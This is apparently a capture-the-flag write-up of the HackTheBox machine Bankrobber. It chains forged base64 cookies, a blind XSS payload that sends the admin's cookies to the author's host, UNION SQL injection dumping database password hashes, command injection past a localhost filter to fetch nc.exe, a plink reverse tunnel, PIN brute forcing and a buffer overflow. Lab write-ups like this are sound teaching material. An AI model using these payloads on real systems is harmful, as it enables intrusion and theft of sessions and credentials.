---
layout: writeup
title: "The Bank That Robbed Itself"
date: 2020-03-15
description: "Bankrobber is an insane Windows web box. Chain a blind XSS into the bank's own localhost, slip a command past a localhost-only filter for a foothold, then brute a four-digit PIN and overflow a hidden teller binary to walk out as root."
image: /assets/og/bankrobber.png
tags: [hackthebox, xss, ssrf, sqli, bufferoverflow, windows, writeup]
---

# The Bank That Robbed Itself

**HTB Bankrobber — borrow the manager's own browser to rob the vault from the inside, then overflow a four-digit teller to become root**

This was the first active box I ever rooted, and it is still one of my favorites. It plays out like a real engagement. There is no exotic zero-day anywhere in it. There is a bank that trusts the wrong things in the right order, and the whole break is just you lining those trusts up like dominoes. You cannot reach the vault from the street, so you write the manager a note, and you let him open it for you.

```
        B A N K R O B B E R
        ===================
        base64 cookie   ->  forge a badge, learn the admin exists
                   |
        blind xss       ->  the admin bot renders your note and runs it
                   |
        steal session   ->  sit down at the admin desk
                   |
        "localhost only" command box  ->  make HIS browser call it
                   |
        a 4-digit teller on a hidden port  ->  brute it, then overflow it
                   |
                   v
        you never picked a lock.
        you handed the bank a pen and it signed everything over.
                                                            盗
```

## 0x01 · the lobby

One scan, four open doors. A web app on 80 and 443, SMB on 445, and a MariaDB on 3306. The SMB port and the version banners say Windows.

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          E-coin
443/tcp  open  ssl/http      Apache 2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
445/tcp  open  microsoft-ds  Windows (workgroup: WORKGROUP)
3306/tcp open  mysql         MariaDB (unauthorized)
```

The site is a small cryptocurrency bank called E-coin. You can register, log in, and move fake coins from one account to another. The name of the box is a promise, so the plan is simple. Find the vault.

## 0x02 · the teller's badge

Registering and logging in is the whole tutorial. Watch what the server hands back the moment you log in:

```
Set-Cookie: id=25
Set-Cookie: username=bW90aGVy
Set-Cookie: password=Z29vc2U=
```

That is not a session. That is your name and password written in base64 and taped to your shirt. base64 is not encryption, it is a costume. `bW90aGVy` is just `mother` wearing sunglasses. The server reads the badge on every request and trusts it completely, so whoever holds badge `id=1` is almost certainly the manager.

The login form also tells on itself. Register a name that is taken and it answers `User already exists`. Register a free name and it says `User created`. That difference is a yes or no oracle for "is this a real account," and the first name it confirms is `admin`. So an admin exists, the badge is forgeable, and there are no lockouts on the login. Brute force is on the table, but bringing a sledgehammer to an insane box felt wrong, so I kept reading.

## 0x03 · the note the manager reads

The transfer page has a comment field, and when you submit a transfer it pops a friendly message. The admin will review your request in a minute. Read that sentence like an attacker. A human, holding a logged-in admin session, is about to open and render whatever you typed. That is the textbook setup for a blind cross-site scripting bug.

Blind XSS is a note dropped in a complaint box. You never watch the manager read it, but you write it so that the act of reading it makes him do something for you. Here the note is a script tag that points his browser at a small script on my own host:

```
<script src=http://10.10.14.4/grab.js></script>
```

`grab.js` is nothing clever. It reads `document.cookie` and tacks it onto an image request back to me, so when the admin bot renders my comment, his own browser quietly mails me his badge. A couple of minutes later my web server logs the hit, and there are the admin cookies, base64 again:

```
GET /?c=username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==; id=1
```

Decode them and the manager's badge is `admin / Hopelessromantic`. Set those cookies, refresh, and the page sends me to `/admin` instead of `/user`.

## 0x04 · the admin desk

The admin desk has more to touch. One field takes a number and prints a matching record, and the first thing I always try on a field like that is a single quote. It answers with a SQL syntax error, which is the database admitting the field is wired straight into a query. From there it is a standard UNION walk to ask the database questions it was never built to answer.

A UNION injection is sliding your own blank questions onto the bottom of a form the clerk is already filling out. He answers all of them in the same handwriting, so your questions come back looking official:

```
1' OR '1' AND '1'='2' UNION SELECT 1,user(),3-- -
   ->  root@localhost

1' OR '1' AND '1'='2' UNION SELECT group_concat(table_name),2,3
   FROM information_schema.tables WHERE table_schema=database()-- -
   ->  database: bankrobber

1' OR '1' AND '1'='2' UNION SELECT concat(host,user,password),2,3
   FROM mysql.user-- -
   ->  root  *F435725A...0FF4D0C4   (MySQL5 SHA-1)
```

That hash cracks to `Welkom1!`, but it is the database's root, not the machine's, so it is a souvenir more than a key. The interesting thing on the desk is a box labelled backdoor checker. It claims it will run commands to hunt for backdoors, but only the `dir` command, and only from the machine itself:

```
It's only allowed to access this function from localhost (::1).
```

I spent a while forging headers to look like localhost and got nowhere. The check is real. The request genuinely has to come from the box.

## 0x05 · making the bank call itself

Then the two halves clicked together. I cannot reach that command box from the street, but I already own a way to make someone on the inside click things for me. The admin bot runs on the box. Its browser is on localhost. So I stop knocking on the door myself and write the bot another note, one that tells his browser to make the localhost request for me.

This is the move the box is named for. It is a request forgery built out of the victim's own browser. I cannot flip the switch behind the counter, so I get the guard who is already inside to flip it for me. The new note posts to the local command box, and the command smuggles a second instruction past the `dir` filter with a pipe:

```
POST http://localhost/admin/backdoorchecker.php
cmd=dir | < download nc.exe into a writable spool folder >
```

The download stage is a plain PowerShell web request pulling `nc.exe` off my host. A second note then runs it, and that part I keep as a description rather than a copy-paste gadget:

```
cmd=dir | [ run the dropped nc.exe as a reverse shell back to 10.10.14.4:4444 ]
```

I keep a listener open, send the comment, and wait for the bot to read it. The shell lands as `bankrobber\cortin`. First flag.

```
C:\xampp\htdocs\admin> whoami
bankrobber\cortin
C:\Users\Cortin\Desktop> type user.txt
████████████████████████████████
```

## 0x06 · the line out the back

Enumerating as cortin turns up two things that belong together. There is a `bankv2.exe` sitting near the web root, and `netstat` shows a service listening on port 910 that was never exposed to the outside:

```
TCP    0.0.0.0:910    LISTENING
```

A service bound only to the box is a private phone line with no jack in the lobby. To use it I drill my own jack. I drop `plink.exe` and open a reverse tunnel that forwards the box's port 910 back to a port on my machine:

```
plink.exe -N -R 4000:127.0.0.1:910 10.10.14.4
```

Now connecting to my own port 4000 reaches the hidden teller. It is the bank's internal transfer terminal, and it wants a four-digit PIN:

```
Internet E-Coin Transfer System
Please enter your super secret 4 digit PIN code to login:
[$]
```

Four digits is ten thousand doors, and there is no lockout, so I do not guess, I count. A two-line Python loop walks `0000` through `9999`:

```python
from itertools import product
for n in product('0123456789', repeat=4):
    print(''.join(n))
```

The terminal accepts `0021`, then asks for a transfer amount and warns that it disconnects if you dawdle. The door is open, but it slams fast.

## 0x07 · four digits and a long sentence

Feeding the amount field a long string makes the program's own output start to corrupt, which is the tell for a buffer overflow. The field copies your input into a small box in memory without checking how much you typed, so write past the end of the box and your characters spill onto whatever sits next.

Picture a form with a tiny line for "amount," and just below it, off the page, the printed instruction the clerk reads next to decide what to do. Write a sentence longer than the line and your words run onto the instruction. The clerk reads your words as the instruction.

What sits past the end of this field is the address the program jumps to when it goes to run its bundled transfer helper. Overwrite that address and the program jumps wherever you point it. I point it at a command of my own instead of the helper:

```
[ padding to reach the saved call address ]
[ overwrite it with an address that redirects execution ]
[ to a command: reverse shell back to 10.10.14.4:6962 ]
```

You have to be gentle here, because one wrong length crashes the service and you start over from the PIN. Once the lengths line up, the overflowed call runs my command instead of the bank's, and a shell comes back as the account that owns the teller. That account is root of the box.

```
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x08 · the honest caveat

Nothing on Bankrobber was an accident of a missing patch. Every door was the bank trusting itself. It trusted a badge that was only a base64 name, so anyone could read who the manager was. It trusted that a request from localhost was safe, while keeping a logged-in robot on localhost that would click any link a stranger left in a comment. It trusted that its own teller program would never be handed more characters than the form had room for.

The blind XSS into localhost is the lesson worth carrying. A control that says "only from localhost" is only as strong as your confidence that no attacker can borrow a localhost mouth. The moment a logged-in bot renders attacker text on that machine, "localhost only" quietly becomes "anyone who can leave a note." And in any C program that copies input without measuring it, the length of the input is a weapon. The fixes are boring and total. Sign your sessions instead of trusting a costume. Do not run a bot that opens strangers' mail with the manager's keys. Measure your buffers.

## 0x09 · outro

```
a cookie that was just a name in a costume.
a note the manager opened with his own keys.
a command box that only trusted the house, in a house full of your notes.
a teller with four digits and no patience, and a form longer than its line.

nothing here was unpatched. the bank trusted itself, in order.
you never robbed the vault. you handed the bank a pen and it signed everything over.

forge the badge. mail the note. count to ten thousand. overflow the line. wear black.

                                                            EOF
```

---

*HTB: Bankrobber — an insane Windows box retired in March 2020, and the first active machine I ever rooted. It is a web-app engagement in miniature: a forged session, a blind XSS, a localhost request forgery, a SQL injection souvenir, a hidden service tunnelled out, and a buffer overflow for the crown. No zero-days. Just a bank that trusted itself one too many times.*
